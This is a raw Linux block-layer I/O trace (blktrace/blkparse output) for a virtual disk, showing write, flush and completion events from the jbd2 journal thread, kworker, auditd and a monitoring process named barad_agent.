0.000980014 291 UT N [jbd2/vda1-8] 1 253,0 1 87 0.000980420 291 I WS 7928704 + 224 [jbd2/vda1-8] 253,0 1 88 0.000981785 291 D WS 7928704 + 224 [jbd2/vda1-8] 253,0 0 9 0.003244357 0 C WS 7928704 + 224 [0] 253,0 0 10 0.003271459 291 A FWFS 7928928 + 8 <- (253,1) 7926880 253,0 0 11 0.003271854 291 Q FWFS 7928928 + 8 [jbd2/vda1-8] 253,0 0 12 0.003272053 291 G FWFS 7928928 + 8 [jbd2/vda1-8] 253,0 0 13 0.003398213 284 D WS 7928928 + 8 [kworker/0:1H] 253,0 0 14 0.004277985 0 C WS 7928928 + 8 [0] 253,0 0 15 0.004446931 0 C WS 7928928 [0] 253,0 1 89 0.004495486 31360 A WS 18285248 + 8 <- (253,1) 18283200 253,0 1 90 0.004496628 31360 Q WS 18285248 + 8 [barad_agent] 253,0 1 91 0.004497546 31360 G WS 18285248 + 8 [barad_agent] 253,0 1 92 0.004498526 31360 P N [barad_agent] 253,0 1 93 0.004498959 31360 UT N [barad_agent] 1 253,0 1 94 0.004499336 31360 I WS 18285248 + 8 [barad_agent] 253,0 1 95 0.004500300 31360 D WS 18285248 + 8 [barad_agent] 253,0 0 16 0.005671600 0 C WS 18285248 + 8 [0] 253,0 0 17 0.005701797 291 A WS 7928936 + 8 <- (253,1) 7926888 253,0 0 18 0.005702238 291 Q WS 7928936 + 8 [jbd2/vda1-8] 253,0 0 19 0.005702707 291 G WS 7928936 + 8 [jbd2/vda1-8] 253,0 0 20 0.005703252 291 P N [jbd2/vda1-8] 253,0 0 21 0.005703515 291 A WS 7928944 + 8 <- (253,1) 7926896 253,0 0 22 0.005703710 291 Q WS 7928944 + 8 [jbd2/vda1-8] 253,0 0 23 0.005704211 291 M WS 7928944 + 8 [jbd2/vda1-8] 253,0 0 24 0.005704793 291 A WS 7928952 + 8 <- (253,1) 7926904 253,0 0 25 0.005704987 291 Q WS 7928952 + 8 [jbd2/vda1-8] 253,0 0 26 0.005705122 291 M WS 7928952 + 8 [jbd2/vda1-8] 253,0 0 27 0.005705561 291 UT N [jbd2/vda1-8] 1 253,0 0 28 0.005705843 291 I WS 7928936 + 24 [jbd2/vda1-8] 253,0 0 29 0.005706577 291 D WS 7928936 + 24 [jbd2/vda1-8] 253,0 0 30 0.006453326 0 C WS 7928936 + 24 [0] 253,0 0 31 0.006460459 291 A FWFS 7928960 + 8 <- (253,1) 7926912 253,0 0 32 0.006460644 291 Q FWFS 7928960 + 8 [jbd2/vda1-8] 253,0 0 33 0.006460804 291 G FWFS 7928960 + 8 [jbd2/vda1-8] 253,0 0 34 0.006550733 284 D WS 7928960 + 8 [kworker/0:1H] 253,0 0 35 0.007294926 0 C WS 7928960 + 8 [0] 253,0 0 36 0.007375389 0 C WS 7928960 [0] 253,0 1 96 0.007428746 31360 A WS 25411448 + 16 <- (253,1) 25409400 253,0 1 97 0.007429357 31360 Q WS 25411448 + 16 [barad_agent] 253,0 1 98 0.007429742 31360 G WS 25411448 + 16 [barad_agent] 253,0 1 99 0.007430337 31360 P N [barad_agent] 253,0 1 100 0.007430888 31360 A WS 25206952 + 8 <- (253,1) 25204904 253,0 1 101 0.007431068 31360 Q WS 25206952 + 8 [barad_agent] 253,0 1 102 0.007431411 31360 G WS 25206952 + 8 [barad_agent] 253,0 1 103 0.007432195 31360 UT N [barad_agent] 2 253,0 1 104 0.007432429 31360 I WS 25206952 + 8 [barad_agent] 253,0 1 105 0.007432808 31360 I WS 25411448 + 16 [barad_agent] 253,0 1 106 0.007433532 31360 D WS 25206952 + 8 [barad_agent] 253,0 1 107 0.007436657 31360 D WS 25411448 + 16 [barad_agent] 253,0 0 37 0.008105745 0 C WS 25411448 + 16 [0] 253,0 0 38 0.008250164 0 C WS 25206952 + 8 [0] 253,0 0 39 0.008275094 291 A WS 7928968 + 8 <- (253,1) 7926920 253,0 0 40 0.008275352 291 Q WS 7928968 + 8 [jbd2/vda1-8] 253,0 0 41 0.008275740 291 G WS 7928968 + 8 [jbd2/vda1-8] 253,0 0 42 0.008276186 291 P N [jbd2/vda1-8] 253,0 0 43 0.008276442 291 A WS 7928976 + 8 <- (253,1) 7926928 253,0 0 44 0.008276634 291 Q WS 7928976 + 8 [jbd2/vda1-8] 253,0 0 45 0.008276894 291 M WS 7928976 + 8 [jbd2/vda1-8] 253,0 0 46 0.008277305 291 UT N [jbd2/vda1-8] 1 253,0 0 47 0.008277559 291 I WS 7928968 + 16 [jbd2/vda1-8] 253,0 0 48 0.008278189 291 D WS 7928968 + 16 [jbd2/vda1-8] 253,0 0 49 0.008908633 0 C WS 7928968 + 16 [0] 253,0 0 50 0.008915078 291 A FWFS 7928984 + 8 <- (253,1) 7926936 253,0 0 51 0.008915273 291 Q FWFS 7928984 + 8 [jbd2/vda1-8] 253,0 0 52 0.008915434 291 G FWFS 7928984 + 8 [jbd2/vda1-8] 253,0 0 53 0.009002428 284 D WS 7928984 + 8 [kworker/0:1H] 253,0 0 54 0.010153741 0 C WS 7928984 + 8 [0] 253,0 0 55 0.010240596 0 C WS 7928984 [0] 253,0 1 108 0.011372486 31360 A WS 25475000 + 8 <- (253,1) 25472952 253,0 1 109 0.011373483 31360 Q WS 25475000 + 8 [barad_agent] 253,0 1 110 0.011374518 31360 G WS 25475000 + 8 [barad_agent] 253,0 1 111 0.011375757 31360 P N [barad_agent] 253,0 1 112 0.011376731 31360 UT N [barad_agent] 1 253,0 1 113 0.011377166 31360 I WS 25475000 + 8 [barad_agent] 253,0 1 114 0.011379302 31360 D WS 25475000 + 8 [barad_agent] 253,0 0 56 0.012743466 0 C WS 25475000 + 8 [0] 253,0 0 57 0.012795600 291 A WS 7928992 + 8 <- (253,1) 7926944 253,0 0 58 0.012796158 291 Q WS 7928992 + 8 [jbd2/vda1-8] 253,0 0 59 0.012796744 291 G WS 7928992 + 8 [jbd2/vda1-8] 253,0 0 60 0.012797748 291 P N [jbd2/vda1-8] 253,0 0 61 0.012798154 291 A WS 7929000 + 8 <- (253,1) 7926952 253,0 0 62 0.012798341 291 Q WS 7929000 + 8 [jbd2/vda1-8] 253,0 0 63 0.012798821 291 M WS 7929000 + 8 [jbd2/vda1-8] 253,0 0 64 0.012799214 291 A WS 7929008 + 8 <- (253,1) 7926960 253,0 0 65 0.012799421 291 Q WS 7929008 + 8 [jbd2/vda1-8] 253,0 0 66 0.012799553 291 M WS 7929008 + 8 [jbd2/vda1-8] 253,0 0 67 0.012799802 291 A WS 7929016 + 8 <- (253,1) 7926968 253,0 0 68 0.012799985 291 Q WS 7929016 + 8 [jbd2/vda1-8] 253,0 0 69 0.012800117 291 M WS 7929016 + 8 [jbd2/vda1-8] 253,0 0 70 0.012800395 291 A WS 7929024 + 8 <- (253,1) 7926976 253,0 0 71 0.012800532 291 Q WS 7929024 + 8 [jbd2/vda1-8] 253,0 0 72 0.012800676 291 M WS 7929024 + 8 [jbd2/vda1-8] 253,0 0 73 0.012800951 291 A WS 7929032 + 8 <- (253,1) 7926984 253,0 0 74 0.012801089 291 Q WS 7929032 + 8 [jbd2/vda1-8] 253,0 0 75 0.012801219 291 M WS 7929032 + 8 [jbd2/vda1-8] 253,0 0 76 0.012801521 291 A WS 7929040 + 8 <- (253,1) 7926992 253,0 0 77 0.012801708 291 Q WS 7929040 + 8 [jbd2/vda1-8] 253,0 0 78 0.012801834 291 M WS 7929040 + 8 [jbd2/vda1-8] 253,0 0 79 0.012802485 291 A WS 7929048 + 8 <- (253,1) 7927000 253,0 0 80 0.012802672 291 Q WS 7929048 + 8 [jbd2/vda1-8] 253,0 0 81 0.012802804 291 M WS 7929048 + 8 [jbd2/vda1-8] 253,0 0 82 0.012803134 291 A WS 7929056 + 8 <- (253,1) 7927008 253,0 0 83 0.012803328 291 Q WS 7929056 + 8 [jbd2/vda1-8] 253,0 0 84 0.012803473 291 M WS 7929056 + 8 [jbd2/vda1-8] 253,0 0 85 0.012804057 291 UT N [jbd2/vda1-8] 1 253,0 0 86 0.012804345 291 I WS 7928992 + 72 [jbd2/vda1-8] 253,0 0 87 0.012805270 291 D WS 7928992 + 72 [jbd2/vda1-8] 253,0 0 88 0.014191981 0 C WS 7928992 + 72 [0] 253,0 0 89 0.014203185 291 A FWFS 7929064 + 8 <- (253,1) 7927016 253,0 0 90 0.014203387 291 Q FWFS 7929064 + 8 [jbd2/vda1-8] 253,0 0 91 0.014203573 291 G FWFS 7929064 + 8 [jbd2/vda1-8] 253,0 0 92 0.014317414 284 D WS 7929064 + 8 [kworker/0:1H] 253,0 0 93 0.015572547 0 C WS 7929064 + 8 [0] 253,0 0 94 0.015655392 0 C WS 7929064 [0] 253,0 1 115 0.015690905 31360 A WS 25475000 + 8 <- (253,1) 25472952 253,0 1 116 0.015691641 31360 Q WS 25475000 + 8 [barad_agent] 253,0 1 117 0.015692260 31360 G WS 25475000 + 8 [barad_agent] 253,0 1 118 0.015692946 31360 P N [barad_agent] 253,0 1 119 0.015693391 31360 UT N [barad_agent] 1 253,0 1 120 0.015693669 31360 I WS 25475000 + 8 [barad_agent] 253,0 1 121 0.015694488 31360 D WS 25475000 + 8 [barad_agent] 253,0 0 95 0.016523177 0 C WS 25475000 + 8 [0] 253,0 0 96 0.016558752 291 A WS 7929072 + 8 <- (253,1) 7927024 253,0 0 97 0.016559072 291 Q WS 7929072 + 8 [jbd2/vda1-8] 253,0 0 98 0.016559528 291 G WS 7929072 + 8 [jbd2/vda1-8] 253,0 0 99 0.016560087 291 P N [jbd2/vda1-8] 253,0 0 100 0.016560386 291 A WS 7929080 + 8 <- (253,1) 7927032 253,0 0 101 0.016560984 291 Q WS 7929080 + 8 [jbd2/vda1-8] 253,0 0 102 0.016561293 291 M WS 7929080 + 8 [jbd2/vda1-8] 253,0 0 103 0.016561785 291 UT N [jbd2/vda1-8] 1 253,0 0 104 0.016562064 291 I WS 7929072 + 16 [jbd2/vda1-8] 253,0 0 105 0.016562819 291 D WS 7929072 + 16 [jbd2/vda1-8] 253,0 0 106 0.017230216 0 C WS 7929072 + 16 [0] 253,0 0 107 0.017237203 291 A FWFS 7929088 + 8 <- (253,1) 7927040 253,0 0 108 0.017237406 291 Q FWFS 7929088 + 8 [jbd2/vda1-8] 253,0 0 109 0.017237572 291 G FWFS 7929088 + 8 [jbd2/vda1-8] 253,0 0 110 0.017321427 284 D WS 7929088 + 8 [kworker/0:1H] 253,0 0 111 0.018309440 0 C WS 7929088 + 8 [0] 253,0 0 112 0.018403911 0 C WS 7929088 [0] 253,0 1 122 0.018439004 31360 A WS 25411448 + 16 <- (253,1) 25409400 253,0 1 123 0.018439495 31360 Q WS 25411448 + 16 [barad_agent] 253,0 1 124 0.018439938 31360 G WS 25411448 + 16 [barad_agent] 253,0 1 125 0.018440502 31360 P N [barad_agent] 253,0 1 126 0.018441134 31360 A WS 25206952 + 8 <- (253,1) 25204904 253,0 1 127 0.018441338 31360 Q WS 25206952 + 8 [barad_agent] 253,0 1 128 0.018441682 31360 G WS 25206952 + 8 [barad_agent] 253,0 1 129 0.018442452 31360 UT N [barad_agent] 2 253,0 1 130 0.018442691 31360 I WS 25206952 + 8 [barad_agent] 253,0 1 131 0.018443137 31360 I WS 25411448 + 16 [barad_agent] 253,0 1 132 0.018443956 31360 D WS 25206952 + 8 [barad_agent] 253,0 1 133 0.018447486 31360 D WS 25411448 + 16 [barad_agent] 253,0 0 113 0.019121789 0 C WS 25411448 + 16 [0] 253,0 0 114 0.019328776 0 C WS 25206952 + 8 [0] 253,0 0 115 0.019355356 291 A WS 7929096 + 8 <- (253,1) 7927048 253,0 0 116 0.019355582 291 Q WS 7929096 + 8 [jbd2/vda1-8] 253,0 0 117 0.019355967 291 G WS 7929096 + 8 [jbd2/vda1-8] 253,0 0 118 0.019356438 291 P N [jbd2/vda1-8] 253,0 0 119 0.019356776 291 A WS 7929104 + 8 <- (253,1) 7927056 253,0 0 120 0.019356963 291 Q WS 7929104 + 8 [jbd2/vda1-8] 253,0 0 121 0.019357243 291 M WS 7929104 + 8 [jbd2/vda1-8] 253,0 0 122 0.019357696 291 UT N [jbd2/vda1-8] 1 253,0 0 123 0.019357942 291 I WS 7929096 + 16 [jbd2/vda1-8] 253,0 0 124 0.019358583 291 D WS 7929096 + 16 [jbd2/vda1-8] 253,0 0 125 0.020135467 0 C WS 7929096 + 16 [0] 253,0 0 126 0.020150134 291 A FWFS 7929112 + 8 <- (253,1) 7927064 253,0 0 127 0.020150867 291 Q FWFS 7929112 + 8 [jbd2/vda1-8] 253,0 0 128 0.020151264 291 G FWFS 7929112 + 8 [jbd2/vda1-8] 253,0 0 129 0.020511308 284 D WS 7929112 + 8 [kworker/0:1H] 253,0 0 130 0.021340905 0 C WS 7929112 + 8 [0] 253,0 0 131 0.021432559 0 C WS 7929112 [0] 253,0 1 134 0.022393544 31360 A WS 25475008 + 8 <- (253,1) 25472960 253,0 1 135 0.022394631 31360 Q WS 25475008 + 8 [barad_agent] 253,0 1 136 0.022395813 31360 G WS 25475008 + 8 [barad_agent] 253,0 1 137 0.022397264 31360 P N [barad_agent] 253,0 1 138 0.022398347 31360 UT N [barad_agent] 1 253,0 1 139 0.022398788 31360 I WS 25475008 + 8 [barad_agent] 253,0 1 140 0.022416608 31360 D WS 25475008 + 8 [barad_agent] 253,0 0 132 0.023458688 0 C WS 25475008 + 8 [0] 253,0 0 133 0.023494955 291 A WS 7929120 + 8 <- (253,1) 7927072 253,0 0 134 0.023495563 291 Q WS 7929120 + 8 [jbd2/vda1-8] 253,0 0 135 0.023496345 291 G WS 7929120 + 8 [jbd2/vda1-8] 253,0 0 136 0.023497465 291 P N [jbd2/vda1-8] 253,0 0 137 0.023497937 291 A WS 7929128 + 8 <- (253,1) 7927080 253,0 0 138 0.023498136 291 Q WS 7929128 + 8 [jbd2/vda1-8] 253,0 0 139 0.023498675 291 M WS 7929128 + 8 [jbd2/vda1-8] 253,0 0 140 0.023499096 291 A WS 7929136 + 8 <- (253,1) 7927088 253,0 0 141 0.023499281 291 Q WS 7929136 + 8 [jbd2/vda1-8] 253,0 0 142 0.023499421 291 M WS 7929136 + 8 [jbd2/vda1-8] 253,0 0 143 0.023499751 291 A WS 7929144 + 8 <- (253,1) 7927096 253,0 0 144 0.023499883 291 Q WS 7929144 + 8 [jbd2/vda1-8] 253,0 0 145 0.023500016 291 M WS 7929144 + 8 [jbd2/vda1-8] 253,0 0 146 0.023500284 291 A WS 7929152 + 8 <- (253,1) 7927104 253,0 0 147 0.023500416 291 Q WS 7929152 + 8 [jbd2/vda1-8] 253,0 0 148 0.023500547 291 M WS 7929152 + 8 [jbd2/vda1-8] 253,0 0 149 0.023500739 291 A WS 7929160 + 8 <- (253,1) 7927112 253,0 0 150 0.023500873 291 Q WS 7929160 + 8 [jbd2/vda1-8] 253,0 0 151 0.023501005 291 M WS 7929160 + 8 [jbd2/vda1-8] 253,0 0 152 0.023501279 291 A WS 7929168 + 8 <- (253,1) 7927120 253,0 0 153 0.023501412 291 Q WS 7929168 + 8 [jbd2/vda1-8] 253,0 0 154 0.023501547 291 M WS 7929168 + 8 [jbd2/vda1-8] 253,0 0 155 0.023501974 291 A WS 7929176 + 8 <- (253,1) 7927128 253,0 0 156 0.023502168 291 Q WS 7929176 + 8 [jbd2/vda1-8] 253,0 0 157 0.023502301 291 M WS 7929176 + 8 [jbd2/vda1-8] 253,0 0 158 0.023502979 291 UT N [jbd2/vda1-8] 1 253,0 0 159 0.023503390 291 I WS 7929120 + 64 [jbd2/vda1-8] 253,0 0 160 0.023504516 291 D WS 7929120 + 64 [jbd2/vda1-8] 253,0 0 161 0.024602854 0 C WS 7929120 + 64 [0] 253,0 0 162 0.024616650 291 A FWFS 7929184 + 8 <- (253,1) 7927136 253,0 0 163 0.024617176 291 Q FWFS 7929184 + 8 [jbd2/vda1-8] 253,0 0 164 0.024617411 291 G FWFS 7929184 + 8 [jbd2/vda1-8] 253,0 0 165 0.024713783 284 D WS 7929184 + 8 [kworker/0:1H] 253,0 0 166 0.025436970 0 C WS 7929184 + 8 [0] 253,0 0 167 0.025517106 0 C WS 7929184 [0] 253,0 1 141 0.025552987 31360 A WS 25475008 + 8 <- (253,1) 25472960 253,0 1 142 0.025553735 31360 Q WS 25475008 + 8 [barad_agent] 253,0 1 143 0.025554451 31360 G WS 25475008 + 8 [barad_agent] 253,0 1 144 0.025555171 31360 P N [barad_agent] 253,0 1 145 0.025555615 31360 UT N [barad_agent] 1 253,0 1 146 0.025555946 31360 I WS 25475008 + 8 [barad_agent] 253,0 1 147 0.025556859 31360 D WS 25475008 + 8 [barad_agent] 253,0 0 168 0.026328848 0 C WS 25475008 + 8 [0] 253,0 0 169 0.026357842 291 A WS 7929192 + 8 <- (253,1) 7927144 253,0 0 170 0.026358278 291 Q WS 7929192 + 8 [jbd2/vda1-8] 253,0 0 171 0.026358811 291 G WS 7929192 + 8 [jbd2/vda1-8] 253,0 0 172 0.026359496 291 P N [jbd2/vda1-8] 253,0 0 173 0.026359835 291 A WS 7929200 + 8 <- (253,1) 7927152 253,0 0 174 0.026360019 291 Q WS 7929200 + 8 [jbd2/vda1-8] 253,0 0 175 0.026360356 291 M WS 7929200 + 8 [jbd2/vda1-8] 253,0 0 176 0.026360865 291 UT N [jbd2/vda1-8] 1 253,0 0 177 0.026361259 291 I WS 7929192 + 16 [jbd2/vda1-8] 253,0 0 178 0.026362035 291 D WS 7929192 + 16 [jbd2/vda1-8] 253,0 0 179 0.027045353 0 C WS 7929192 + 16 [0] 253,0 0 180 0.027054385 291 A FWFS 7929208 + 8 <- (253,1) 7927160 253,0 0 181 0.027054673 291 Q FWFS 7929208 + 8 [jbd2/vda1-8] 253,0 0 182 0.027054890 291 G FWFS 7929208 + 8 [jbd2/vda1-8] 253,0 0 183 0.027139235 284 D WS 7929208 + 8 [kworker/0:1H] 253,0 0 184 0.027877565 0 C WS 7929208 + 8 [0] 253,0 0 185 0.027956059 0 C WS 7929208 [0] 253,0 1 148 0.027992206 31360 A WS 25411448 + 16 <- (253,1) 25409400 253,0 1 149 0.027992686 31360 Q WS 25411448 + 16 [barad_agent] 253,0 1 150 0.027993213 31360 G WS 25411448 + 16 [barad_agent] 253,0 1 151 0.027993727 31360 P N [barad_agent] 253,0 1 152 0.027994497 31360 A WS 25206928 + 8 <- (253,1) 25204880 253,0 1 153 0.027994701 31360 Q WS 25206928 + 8 [barad_agent] 253,0 1 154 0.027995006 31360 G WS 25206928 + 8 [barad_agent] 253,0 1 155 0.027995871 31360 UT N [barad_agent] 2 253,0 1 156 0.027996160 31360 I WS 25206928 + 8 [barad_agent] 253,0 1 157 0.027996649 31360 I WS 25411448 + 16 [barad_agent] 253,0 1 158 0.027997501 31360 D WS 25206928 + 8 [barad_agent] 253,0 1 159 0.028001198 31360 D WS 25411448 + 16 [barad_agent] 253,0 0 186 0.028714563 0 C WS 25206928 + 8 [0] 253,0 0 187 0.028743236 0 C WS 25411448 + 16 [0] 253,0 0 188 0.028769004 291 A WS 7929216 + 8 <- (253,1) 7927168 253,0 0 189 0.028769262 291 Q WS 7929216 + 8 [jbd2/vda1-8] 253,0 0 190 0.028769657 291 G WS 7929216 + 8 [jbd2/vda1-8] 253,0 0 191 0.028770114 291 P N [jbd2/vda1-8] 253,0 0 192 0.028770470 291 A WS 7929224 + 8 <- (253,1) 7927176 253,0 0 193 0.028770667 291 Q WS 7929224 + 8 [jbd2/vda1-8] 253,0 0 194 0.028770921 291 M WS 7929224 + 8 [jbd2/vda1-8] 253,0 0 195 0.028771419 291 UT N [jbd2/vda1-8] 1 253,0 0 196 0.028771724 291 I WS 7929216 + 16 [jbd2/vda1-8] 253,0 0 197 0.028772493 291 D WS 7929216 + 16 [jbd2/vda1-8] 253,0 0 198 0.029504720 0 C WS 7929216 + 16 [0] 253,0 0 199 0.029512617 291 A FWFS 7929232 + 8 <- (253,1) 7927184 253,0 0 200 0.029512873 291 Q FWFS 7929232 + 8 [jbd2/vda1-8] 253,0 0 201 0.029513069 291 G FWFS 7929232 + 8 [jbd2/vda1-8] 253,0 0 202 0.029604935 284 D WS 7929232 + 8 [kworker/0:1H] 253,0 0 203 0.030330323 0 C WS 7929232 + 8 [0] 253,0 0 204 0.030432412 0 C WS 7929232 [0] 253,0 1 160 0.031247827 31360 A WS 25475016 + 8 <- (253,1) 25472968 253,0 1 161 0.031248733 31360 Q WS 25475016 + 8 [barad_agent] 253,0 1 162 0.031249689 31360 G WS 25475016 + 8 [barad_agent] 253,0 1 163 0.031250911 31360 P N [barad_agent] 253,0 1 164 0.031251917 31360 UT N [barad_agent] 1 253,0 1 165 0.031252330 31360 I WS 25475016 + 8 [barad_agent] 253,0 1 166 0.031253744 31360 D WS 25475016 + 8 [barad_agent] 253,0 0 205 0.033154141 0 C WS 25475016 + 8 [0] 253,0 0 206 0.033188363 291 A WS 7929240 + 8 <- (253,1) 7927192 253,0 0 207 0.033188894 291 Q WS 7929240 + 8 [jbd2/vda1-8] 253,0 0 208 0.033189585 291 G WS 7929240 + 8 [jbd2/vda1-8] 253,0 0 209 0.033190507 291 P N [jbd2/vda1-8] 253,0 0 210 0.033190824 291 A WS 7929248 + 8 <- (253,1) 7927200 253,0 0 211 0.033190991 291 Q WS 7929248 + 8 [jbd2/vda1-8] 253,0 0 212 0.033191365 291 M WS 7929248 + 8 [jbd2/vda1-8] 253,0 0 213 0.033191996 291 A WS 7929256 + 8 <- (253,1) 7927208 253,0 0 214 0.033192210 291 Q WS 7929256 + 8 [jbd2/vda1-8] 253,0 0 215 0.033192345 291 M WS 7929256 + 8 [jbd2/vda1-8] 253,0 0 216 0.033192628 291 A WS 7929264 + 8 <- (253,1) 7927216 253,0 0 217 0.033192788 291 Q WS 7929264 + 8 [jbd2/vda1-8] 253,0 0 218 0.033192917 291 M WS 7929264 + 8 [jbd2/vda1-8] 253,0 0 219 0.033193188 291 A WS 7929272 + 8 <- (253,1) 7927224 253,0 0 220 0.033193304 291 Q WS 7929272 + 8 [jbd2/vda1-8] 253,0 0 221 0.033193433 291 M WS 7929272 + 8 [jbd2/vda1-8] 253,0 0 222 0.033193628 291 A WS 7929280 + 8 <- (253,1) 7927232 253,0 0 223 0.033193747 291 Q WS 7929280 + 8 [jbd2/vda1-8] 253,0 0 224 0.033193877 291 M WS 7929280 + 8 [jbd2/vda1-8] 253,0 0 225 0.033194067 291 A WS 7929288 + 8 <- (253,1) 7927240 253,0 0 226 0.033194185 291 Q WS 7929288 + 8 [jbd2/vda1-8] 253,0 0 227 0.033194327 291 M WS 7929288 + 8 [jbd2/vda1-8] 253,0 0 228 0.033194605 291 A WS 7929296 + 8 <- (253,1) 7927248 253,0 0 229 0.033194721 291 Q WS 7929296 + 8 [jbd2/vda1-8] 253,0 0 230 0.033194853 291 M WS 7929296 + 8 [jbd2/vda1-8] 253,0 0 231 0.033195591 291 UT N [jbd2/vda1-8] 1 253,0 0 232 0.033195982 291 I WS 7929240 + 64 [jbd2/vda1-8] 253,0 0 233 0.033196998 291 D WS 7929240 + 64 [jbd2/vda1-8] 253,0 0 234 0.034362372 0 C WS 7929240 + 64 [0] 253,0 0 235 0.034373192 291 A FWFS 7929304 + 8 <- (253,1) 7927256 253,0 0 236 0.034373470 291 Q FWFS 7929304 + 8 [jbd2/vda1-8] 253,0 0 237 0.034373696 291 G FWFS 7929304 + 8 [jbd2/vda1-8] 253,0 0 238 0.034472706 284 D WS 7929304 + 8 [kworker/0:1H] 253,0 0 239 0.035196530 0 C WS 7929304 + 8 [0] 253,0 0 240 0.035285330 0 C WS 7929304 [0] 253,0 1 167 0.035320979 31360 A WS 25475016 + 8 <- (253,1) 25472968 253,0 1 168 0.035321822 31360 Q WS 25475016 + 8 [barad_agent] 253,0 1 169 0.035322749 31360 G WS 25475016 + 8 [barad_agent] 253,0 1 170 0.035323841 31360 P N [barad_agent] 253,0 1 171 0.035324321 31360 UT N [barad_agent] 1 253,0 1 172 0.035324676 31360 I WS 25475016 + 8 [barad_agent] 253,0 1 173 0.035325991 31360 D WS 25475016 + 8 [barad_agent] 253,0 0 241 0.037738108 0 C WS 25475016 + 8 [0] 253,0 0 242 0.037769866 291 A WS 7929312 + 8 <- (253,1) 7927264 253,0 0 243 0.037770331 291 Q WS 7929312 + 8 [jbd2/vda1-8] 253,0 0 244 0.037771003 291 G WS 7929312 + 8 [jbd2/vda1-8] 253,0 0 245 0.037771773 291 P N [jbd2/vda1-8] 253,0 0 246 0.037772035 291 A WS 7929320 + 8 <- (253,1) 7927272 253,0 0 247 0.037772238 291 Q WS 7929320 + 8 [jbd2/vda1-8] 253,0 0 248 0.037772541 291 M WS 7929320 + 8 [jbd2/vda1-8] 253,0 0 249 0.037773170 291 UT N [jbd2/vda1-8] 1 253,0 0 250 0.037773616 291 I WS 7929312 + 16 [jbd2/vda1-8] 253,0 0 251 0.037774465 291 D WS 7929312 + 16 [jbd2/vda1-8] 253,0 0 252 0.038437889 0 C WS 7929312 + 16 [0] 253,0 0 253 0.038443546 291 A FWFS 7929328 + 8 <- (253,1) 7927280 253,0 0 254 0.038443827 291 Q FWFS 7929328 + 8 [jbd2/vda1-8] 253,0 0 255 0.038444097 291 G FWFS 7929328 + 8 [jbd2/vda1-8] 253,0 0 256 0.038529733 284 D WS 7929328 + 8 [kworker/0:1H] 253,0 0 257 0.039309629 0 C WS 7929328 + 8 [0] 253,0 0 258 0.039383908 0 C WS 7929328 [0] 253,0 1 174 0.039436530 31360 A WS 25411448 + 16 <- (253,1) 25409400 253,0 1 175 0.039437228 31360 Q WS 25411448 + 16 [barad_agent] 253,0 1 176 0.039438201 31360 G WS 25411448 + 16 [barad_agent] 253,0 1 177 0.039439280 31360 P N [barad_agent] 253,0 1 178 0.039440282 31360 A WS 25411488 + 8 <- (253,1) 25409440 253,0 1 179 0.039440468 31360 Q WS 25411488 + 8 [barad_agent] 253,0 1 180 0.039440801 31360 G WS 25411488 + 8 [barad_agent] 253,0 1 181 0.039441914 31360 A WS 25206952 + 8 <- (253,1) 25204904 253,0 1 182 0.039442111 31360 Q WS 25206952 + 8 [barad_agent] 253,0 1 183 0.039442395 31360 G WS 25206952 + 8 [barad_agent] 253,0 1 184 0.039443365 31360 UT N [barad_agent] 3 253,0 1 185 0.039443720 31360 I WS 25206952 + 8 [barad_agent] 253,0 1 186 0.039444137 31360 I WS 25411448 + 16 [barad_agent] 253,0 1 187 0.039444301 31360 I WS 25411488 + 8 [barad_agent] 253,0 1 188 0.039445538 31360 D WS 25206952 + 8 [barad_agent] 253,0 1 189 0.039450185 31360 D WS 25411448 + 16 [barad_agent] 253,0 1 190 0.039450924 31360 D WS 25411488 + 8 [barad_agent] 253,0 0 259 0.040087466 0 C WS 25411448 + 16 [0] 253,0 0 260 0.040127395 0 C WS 25411488 + 8 [0] 253,0 0 261 0.040249958 0 C WS 25206952 + 8 [0] 253,0 0 262 0.040280612 291 A WS 7929336 + 8 <- (253,1) 7927288 253,0 0 263 0.040281211 291 Q WS 7929336 + 8 [jbd2/vda1-8] 253,0 0 264 0.040285602 291 G WS 7929336 + 8 [jbd2/vda1-8] 253,0 0 265 0.040286651 291 P N [jbd2/vda1-8] 253,0 0 266 0.040287209 291 A WS 7929344 + 8 <- (253,1) 7927296 253,0 0 267 0.040287499 291 Q WS 7929344 + 8 [jbd2/vda1-8] 253,0 0 268 0.040288012 291 M WS 7929344 + 8 [jbd2/vda1-8] 253,0 0 269 0.040288828 291 UT N [jbd2/vda1-8] 1 253,0 0 270 0.040289335 291 I WS 7929336 + 16 [jbd2/vda1-8] 253,0 0 271 0.040290356 291 D WS 7929336 + 16 [jbd2/vda1-8] 253,0 0 272 0.041012337 0 C WS 7929336 + 16 [0] 253,0 0 273 0.041019669 291 A FWFS 7929352 + 8 <- (253,1) 7927304 253,0 0 274 0.041019970 291 Q FWFS 7929352 + 8 [jbd2/vda1-8] 253,0 0 275 0.041020153 291 G FWFS 7929352 + 8 [jbd2/vda1-8] 253,0 0 276 0.041107629 284 D WS 7929352 + 8 [kworker/0:1H] 253,0 0 277 0.042000051 0 C WS 7929352 + 8 [0] 253,0 0 278 0.042077963 0 C WS 7929352 [0] 253,0 0 279 0.628178798 518 A WS 25181480 + 8 <- (253,1) 25179432 253,0 0 280 0.628180716 518 Q WS 25181480 + 8 [auditd] 253,0 0 281 0.628184067 518 G WS 25181480 + 8 [auditd] 253,0 0 282 0.628187820 518 P N [auditd] 253,0 0 283 0.628189061 518 UT N [auditd] 1 253,0 0 284 0.628190268 518 I WS 25181480 + 8 [auditd] 253,0 0 285 0.628193805 518 D WS 25181480 + 8 [auditd] 253,0 0 286 0.629566828 0 C WS 25181480 + 8 [0] 253,0 1 191 0.629607558 291 A WS 7929360 + 8 <- (253,1) 7927312 253,0 1 192 0.629608842 291 Q WS 7929360 + 8 [jbd2/vda1-8] 253,0 1 193 0.629609934 291 G WS 7929360 + 8 [jbd2/vda1-8] 253,0 1 194 0.629611674 291 P N [jbd2/vda1-8] 253,0 1 195 0.629612235 291 A WS 7929368 + 8 <- (253,1) 7927320 253,0 1 196 0.629612441 291 Q WS 7929368 + 8 [jbd2/vda1-8] 253,0 1 197 0.629613193 291 M WS 7929368 + 8 [jbd2/vda1-8] 253,0 1 198 0.629614221 291 A WS 7929376 + 8 <- (253,1) 7927328 253,0 1 199 0.629614410 291 Q WS 7929376 + 8 [jbd2/vda1-8] 253,0 1 200 0.629614551 291 M WS 7929376 + 8 [jbd2/vda1-8] 253,0 1 201 0.629614907 291 A WS 7929384 + 8 <- (253,1) 7927336 253,0 1 202 0.629615095 291 Q WS 7929384 + 8 [jbd2/vda1-8] 253,0 1 203 0.629615227 291 M WS 7929384 + 8 [jbd2/vda1-8] 253,0 1 204 0.629615550 291 A WS 7929392 + 